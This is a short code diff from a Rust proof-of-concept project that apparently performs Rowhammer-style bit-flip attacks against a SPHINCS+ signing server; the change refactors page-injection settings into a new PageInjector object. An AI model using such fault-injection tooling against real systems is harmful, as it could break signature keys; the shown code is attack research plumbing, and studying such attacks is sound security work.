@@ -10,8 +10,7 @@ use bs_poc::{
     },
     util::{KB, MB},
     victim::{
-        sphincs_plus::{InjectionConfig, SphincsPlus},
-        HammerVictim, HammerVictimError,
+        sphincs_plus::SphincsPlus, HammerVictim, HammerVictimError, InjectionConfig, PageInjector,
     },
 };
 use clap::{arg, Parser};
@@ -97,14 +96,15 @@ fn main() -> anyhow::Result<()> {
 
                 info!("PFN: {:?}", flippy_page.pfn());
                 info!("Launching victim");
+                let injector = PageInjector::new(InjectionConfig {
+                    flippy_page,
+                    flippy_page_size: PAGE_SIZE,
+                    bait_count_after: bait_after,
+                    bait_count_before: bait_before,
+                });
                 let mut victim = match SphincsPlus::new(
                     "/home/jb/sphincsplus/ref/test/server".to_string(),
-                    InjectionConfig {
-                        flippy_page,
-                        flippy_page_size: PAGE_SIZE,
-                        bait_count_after: bait_after,
-                        bait_count_before: bait_before,
-                    },
+                    injector,
                 ) {
                     Ok(v) => v,
                     Err(e) => {
